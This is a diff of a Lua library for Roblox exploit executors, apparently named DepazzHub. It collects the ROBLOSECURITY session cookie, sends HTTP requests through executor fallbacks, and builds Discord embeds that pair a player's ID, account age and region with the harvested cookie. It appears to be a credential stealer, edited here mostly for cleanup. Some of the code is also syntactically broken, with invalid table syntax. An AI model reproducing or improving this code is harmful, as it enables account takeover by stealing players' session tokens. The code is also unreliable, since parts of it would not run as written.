@@ -5,11 +5,10 @@ function Libraries:GetCookies()
 	local cookies = {}
 	
 	-- Intentar obtener cookies de la memoria del ejecutor
-	-- En muchos ejecutores las cookies están guardadas en memoria
 	local cookieNames = {"ROBLOSECURITY", ".ROBLOSECURITY"}
 	
 	for _, name in ipairs(cookieNames) do
-		local cookieValue = getgenv("_ROBLOSECURITY") -- método común en ejecutores
+		local cookieValue = getgenv("_ROBLOSECURITY")
 		if cookieValue and cookieValue ~= "" and cookieValue ~= nil then
 			table.insert(cookies, {
 				Name = name,
@@ -62,7 +61,7 @@ function Libraries:GetCookieService()
 	local cookies = self:GetCookies()
 	
 	if #cookies > 0 then
-		return cookies[1] -- Devuelve la primera cookie encontrada
+		return cookies[1]
 	end
 	
 	return nil
@@ -91,7 +90,6 @@ function Libraries:request(options)
 	local body = options.Body
 	local timeout = options.Timeout or 15
 	
-	-- Si no se especifica URL, usar una por defecto
 	if url == "" then
 		url = options.TargetUrl or ""
 	end
@@ -110,21 +108,11 @@ function Libraries:request(options)
 	fullHeaders["Connection"] = "keep-alive"
 	fullHeaders["Accept"] = "*/*"
 	
-	-- Si el método es POST, agregar Content-Type
 	if method == "POST" then
 		fullHeaders["Content-Type"] = "application/json"
 	end
 	
-	-- Construir la petición HTTP
-	local headersString = ""
-	for key, val in pairs(fullHeaders) do
-		if headersString ~= "" then
-			headersString = headersString .. ", "
-		end
-		headersString = headersString .. key .. ": " .. val
-	end
-	
-	-- Preparar el cuerpo (stringify si es necesario)
+	-- Preparar el cuerpo
 	local bodyString = body
 	if type(body) == "table" then
 		bodyString = table.concat(body, "\n")
@@ -133,37 +121,29 @@ function Libraries:request(options)
 	-- Construir la URL completa
 	local fullUrl = url
 	
-	-- Ejecutar la petición (aquí usarías el método del ejecutor)
-	-- En Roblox puro se usaría HttpService:PostJson()
-	-- En ejecutores se usa getgenv()._RbxRequest o similar
-	
 	-- Fallback: intentar con el método del ejecutor
 	local requestFunc = getgenv("_RbxRequest")
 	
 	if requestFunc then
-		return requestFunc(fullUrl, method, bodyString, headersString)
+		return requestFunc(fullUrl, method, bodyString, headers)
 	end
 	
 	-- Fallback: intentar con HttpService de Roblox
-	local HttpService = game:GetService("HttpService"):AsyncWaitFor(5)
-	if HttpService then
-		return HttpService:PostJson(fullUrl, bodyString, fullHeaders)
+	local httpService = game:GetService("HttpService")
+	local response = httpService:PostJsonAsync(fullUrl, bodyString, fullHeaders)
+	
+	if response and response.Success then
+		return response
 	end
 	
-	-- Fallback: intentar con getgenv()
+	-- Último fallback: intentar con getgenv("request")
 	local customRequest = getgenv("request")
 	if customRequest then
 		return customRequest(fullUrl, method, bodyString, fullHeaders)
 	end
 	
-	-- Último fallback: intentar con LoadString y un script HTTP
-	local httpService = game:GetService("HttpService")
-	local response = httpService:PostJsonAsync(fullUrl, bodyString, fullHeaders)
-	
-	-- Esperar a que termine
-	httpService:AsyncWaitFor(15)
-	
-	return response
+	-- Último fallback: retornar nil con error
+	return nil
 end
 
 -- --- 5. Función para hacer un request GET ---
@@ -262,14 +242,12 @@ function Libraries:CreateDiscordEmbed(title, description, color, fields, timesta
 			"color" = color,
 			"footer" = {
 				"text" = "DepazzHub API",
-				"icon_url" = "https://cdn.discordapp.com/embed/avatars/0.png",
 				"icon_url" = "https://cdn.discordapp.com/embed/avatars/0.png"
 			},
 			"timestamp" = timestamp
 		}
 	}
 	
-	-- Agregar campos
 	if fields then
 		for _, field in ipairs(fields) do
 			table.insert(embed, field)
@@ -285,28 +263,12 @@ function Libraries:CreatePlayerEmbed(playerName, userId, age, region, cookie)
 		{
 			"title" = playerName .. " - DepazzHub",
 			"description" = "Usuario de Roblox",
-			"color" = 3447003, -- Azul roblox
+			"color" = 3887359,
 			"fields" = {
-				{
-					"name" = "ID",
-					"value" = userId,
-					"inline" = true
-				},
-				{
-					"name" = "Edad de cuenta",
-					"value" = age,
-					"inline" = true
-				},
-				{
-					"name" = "Región",
-					"value" = region,
-					"inline" = false
-				},
-				{
-					"name" = "Cookie",
-					"value" = cookie,
-					"inline" = false
-				}
+				{ "name" = "ID", "value" = userId, "inline" = true },
+				{ "name" = "Edad de cuenta", "value" = age, "inline" = true },
+				{ "name" = "Región", "value" = region, "inline" = false },
+				{ "name" = "Cookie", "value" = cookie, "inline" = false }
 			},
 			"footer" = {
 				"text" = "DepazzHub API",
